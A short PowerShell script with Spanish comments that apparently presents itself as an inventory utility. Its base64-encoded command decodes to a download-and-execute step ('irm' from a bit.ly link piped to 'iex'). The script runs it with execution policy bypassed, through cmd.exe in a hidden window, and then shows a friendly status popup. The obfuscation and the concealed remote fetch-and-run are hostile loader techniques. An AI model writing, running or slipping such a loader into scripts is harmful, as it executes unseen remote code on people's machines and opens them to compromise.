# comando PowerShell ya codificado (lo mantienes igual)
$pwCmd = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand aQByAG0AIABoAHQAdABwAHMAOgAvAC8AYgBpAHQALgBsAHkALwBJAG4AdgBlAG4AdABhAHIAaQBvAFMATwBMAEUAWAAgAHwAIABpAGUAeAA='
$arg = "/c `"$pwCmd`""

$wsh = New-Object -ComObject WScript.Shell

# Ejecuta cmd.exe oculto y espera a que termine. Run devuelve el exit code cuando wait = $true.
$exitCode = $wsh.Run("cmd.exe $arg", 0, $true)

# Mostrar un popup con el resultado
if ($exitCode -eq 0) {
    $wsh.Popup("Inventario realizado correctamente", 0, "Estado del Inventario", 64)
} else {
    $wsh.Popup("Error al realizar inventario. Código de salida: $exitCode", 0, "Estado del Inventario", 16)
}
